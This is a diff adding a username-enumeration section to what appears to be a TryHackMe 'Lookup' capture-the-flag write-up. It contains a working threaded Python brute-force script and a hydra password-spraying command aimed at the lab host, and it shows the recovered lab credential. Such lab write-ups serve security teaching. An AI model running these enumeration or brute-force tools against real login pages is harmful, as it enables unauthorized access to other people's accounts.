@@ -69,6 +69,84 @@ It fails to login, hinting the username may not be correct.
 ```bash
 hydra -L /usr/share/seclists/Usernames/Names/names.txt -p password123 lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong password"
 ```
+# Username Enumeration Script with Threading for Lookup (TryHackMe)
+
+This Python script helps **brute-force enumerate valid usernames** on `http://lookup.thm/` during CTFs or lab environments. It uses **threading for speed** and detects valid usernames based on error message differences.
+
+---
+
+## Script
+
+```python
+import requests
+import threading
+from queue import Queue
+
+# ----- CONFIG -----
+url = "http://lookup.thm/"
+wordlist = "/usr/share/seclists/Usernames/Names/names.txt"
+num_threads = 20  # Adjust for system/target stability
+fixed_password = "admin"
+output_file = "valid_usernames.txt"
+# proxies = {"http": "http://127.0.0.1:8080"}
+
+# ------------------
+
+def worker():
+    session = requests.Session()
+    # session.proxies.update(proxies)
+
+    while not q.empty():
+        username = q.get()
+        data = {
+            "username": username,
+            "password": fixed_password
+        }
+        try:
+            response = session.post(url, data=data, timeout=5)
+
+            if "Wrong password" in response.text:
+                print(f"[+] Valid username found: {username}")
+                with lock:
+                    with open(output_file, "a") as f:
+                        f.write(username + "\\n")
+
+            # Optionally print invalids for debugging
+            # elif "Wrong username or password" in response.text:
+            #     print(f"[-] Invalid username: {username}")
+
+            elif "Redirecting" not in response.text:
+                print(f"[?] Unexpected response for {username}")
+
+        except requests.RequestException as e:
+            print(f"[!] Request failed for {username}: {e}")
+
+        q.task_done()
+
+# ----- Load Usernames into Queue -----
+q = Queue()
+with open(wordlist, "r") as f:
+    for line in f:
+        username = line.strip()
+        if username:
+            q.put(username)
+
+# ----- Lock for file writing -----
+lock = threading.Lock()
+
+# ----- Start Threads -----
+threads = []
+for _ in range(num_threads):
+    t = threading.Thread(target=worker, daemon=True)
+    threads.append(t)
+    t.start()
+
+# ----- Wait for all to complete -----
+q.join()
+
+print("[*] Enumeration completed. Check valid_usernames.txt for results.")
+
+---
 
 ✅ **Found:** `jose:password123`
 
